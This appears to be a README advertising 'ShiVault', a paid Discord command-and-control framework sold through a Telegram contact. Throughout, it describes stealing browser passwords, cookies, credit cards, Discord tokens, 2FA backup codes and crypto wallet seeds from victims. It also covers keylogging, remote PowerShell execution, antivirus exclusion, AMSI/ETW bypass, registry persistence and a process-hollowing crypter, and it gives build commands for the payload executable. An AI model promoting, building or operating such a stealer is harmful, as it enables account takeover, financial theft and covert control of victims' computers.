<div align="center">

# ShiVault

### Advanced Discord C2 Framework

[![Go](https://img.shields.io/badge/Go-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)](https://javascript.com)
[![React](https://img.shields.io/badge/React-61DAFB?style=for-the-badge&logo=react&logoColor=black)](https://react.dev)
[![SQLite](https://img.shields.io/badge/SQLite-003B57?style=for-the-badge&logo=sqlite&logoColor=white)](https://sqlite.org)
[![Windows](https://img.shields.io/badge/Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://microsoft.com)

<br/>

**Full-spectrum Discord C2 with browser exfiltration, token grabber, keylogger, and persistent backdoor.**

[**Contact on Telegram**](https://t.me/workowner0001) · [**Get ShiVault**](https://t.me/workowner0001)

<br/>

</div>

---

## Browser Data Exfiltration

| Browser | Cookies | Passwords | Bookmarks | History | Credit Cards |
|---------|:-------:|:---------:|:---------:|:-------:|:------------:|
| Chrome | ✅ AES-GCM/CBC/v20 ABE | ✅ | ✅ | ✅ | ✅ |
| Edge | ✅ AES-GCM/CBC/v20 ABE | ✅ | ✅ | ✅ | ✅ |
| Brave | ✅ AES-GCM/CBC/v20 ABE | ✅ | ✅ | ✅ | ✅ |
| Opera | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
| OperaGX | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
| Vivaldi | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
| Yandex | ✅ AES-GCM/CBC | ✅ | ✅ | ✅ | ✅ |
| Firefox | ✅ NSS Decrypt | ✅ | ✅ | ✅ | — |

> Chromium v20 (App-Bound Encryption) decrypted per-browser with zero browser kills — live SQLite snapshots, targeted last-resort handling only.

### Output Formats

| Data | Format | Importable? |
|------|--------|:-----------:|
| Cookies | Per-category JSON folders | ✅ EditThisCookie, Cookie-Editor |
| Passwords | Chrome CSV | ✅ All browsers + Bitwarden/1Password/LastPass |
| Bookmarks | Netscape HTML | ✅ All browsers |
| History | CSV | Manual review |
| Credit Cards | Bitwarden JSON | ✅ Bitwarden |

### Cookie Folder Structure

```
cookies/
├── google/google.json        ← .google.com, youtube.com, gmail.com
├── discord/discord.json      ← .discord.com, discordapp.com
├── github/github.json        ← .github.com
├── steam/steam.json          ← store.steampowered.com
├── spotify/spotify.json      ← open.spotify.com
├── netflix/netflix.json      ← netflix.com
├── randomsite/randomsite.json ← any unknown domain
└── all_cookies.json          ← full dump
```

---

## Discord Token Grabber

| Feature | Details |
|---------|---------|
| Token extraction | Browser LocalStorage, SessionStorage, Cookies |
| Token enrichment | Email, Phone, Nitro, Boost, MFA, Badges |
| HQ Friends | Badge-level friend list, paginated embeds |
| Nitro tenure badges | Bronze → Opal (1–72 months), Boost 1–9 |
| Custom badge emojis | One-click guild emoji registration from the builder |
| Backup Codes | 2FA backup codes |
| Billing info | Payment methods, billing country |

---

## C2 Commands (30+)

| Command | Description |
|---------|-------------|
| `.run <cmd>` | Execute PowerShell command |
| `.ss` | Screenshot desktop |
| `.screenrec 10 15` | Record screen (duration + fps) |
| `.grab` | Full exfil (tokens + cookies + passwords + bookmarks + history + cards) |
| `.tokens` | Re-collect Discord tokens |
| `.cookies` | Re-collect browser cookies |
| `.passwords` | Re-collect browser passwords |
| `.friend [full] [N]` | Full friends list, rarest first, button pages |
| `.keylog start` | Start live keylogger |
| `.keylog dump` | Download keylog |
| `.ps` | List processes |
| `.kill <pid>` | Kill process |
| `.persist` | Install registry autostart |
| `.unpersist` | Remove autostart |
| `.defender` | Add AV exclusion |
| `.sysinfo` | System information |
| `.wifi` | Saved Wi-Fi networks |
| `.clip` | Read clipboard |
| `.download <path>` | Download file from victim |
| `.upload <url>` | Upload file to victim |
| `.dir` | List current directory |
| `.env` | Environment variables |
| `.help` | Command reference |

---

## Payload Features

| Feature | Implementation |
|---------|---------------|
| AMSI Bypass | `AmsiScanBuffer` + `EtwEventWrite` patching |
| ETW Bypass | `EtwEventWrite` hook |
| Persistence | Registry Run key + Startup folder |
| Obfuscation | XOR string encoding (runtime decode) |
| Anti-Analysis | PE timestamp randomization, overlay jitter |
| Keylogger | `GetAsyncKeyState` with state tracking |
| Screen Recording | FFmpeg GDIGRAB → MP4 → GoFile |
| Cookie Decryption | AES-256-GCM (v10), AES-128-CBC, AES-256-GCM (v20 ABE) |
| Silent boot | @everyone ping only on new victim channel, English C2 |
| Custom EXE icon | Pick .ico/.png in the builder, embedded at compile time |
| Wi-Fi Extraction | `netsh wlan show profiles` + password decrypt |
| Wallet Stealing | Browser extension wallets, local wallet files |
| Crypto Seeds | Mnemonic phrase detection |

---

## Build Pipeline

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Flet UI    │────▶│   core.py    │────▶│  EXE Output  │
│  (Builder)   │     │   Pipeline   │     │  (Delivered) │
└──────────────┘     └──────┬───────┘     └──────────────┘
                            │
            ┌───────────────┼───────────────┐
            ▼               ▼               ▼
      ┌──────────┐   ┌──────────┐   ┌──────────┐
      │   Go     │   │   XOR    │   │ AES-GCM  │
      │ Compile  │   │ Obfuscate│   │ Encrypt  │
      └──────────┘   └──────────┘   └──────────┘
                            │
                            ▼
                    ┌──────────────┐
                    │   Crypter    │
                    │  (Hollowing) │
                    └──────────────┘
```

---

## Quick Start

```bash
# Install dependencies
pip install -r requirements.txt

# Run desktop UI
python main.py

# Run web panel
python shivault_backend/app.py

# Build payload manually
cd void_stealer
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o ../payload.exe
```

---

## Tech Stack

| Component | Technology |
|-----------|------------|
| Payload | Go 1.25, Windows API, XOR obfuscation, hackbrowserdata engine |
| Crypter | AES-256-GCM, Process Hollowing (RunPE) |
| Build Pipeline | Python, pefile, zipfile |
| Desktop UI | Flet (Flutter for Python) |
| Backend | FastAPI, SQLite |
| Admin Panel | React, Vite, TailwindCSS |
| C2 Transport | Discord Bot API v10 |
| Screen Record | FFmpeg (GDIGRAB) |
| File Sharing | GoFile API |

---

## Get ShiVault

<div align="center">

### Ready to deploy?

**Contact on Telegram for access and pricing:**

[![Telegram](https://img.shields.io/badge/Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/workowner0001)

### [@workowner0001](https://t.me/workowner0001)

<br/>

*Full documentation and setup guide included with purchase.*

</div>

---

## License

Private — All rights reserved. Unauthorized distribution is prohibited.
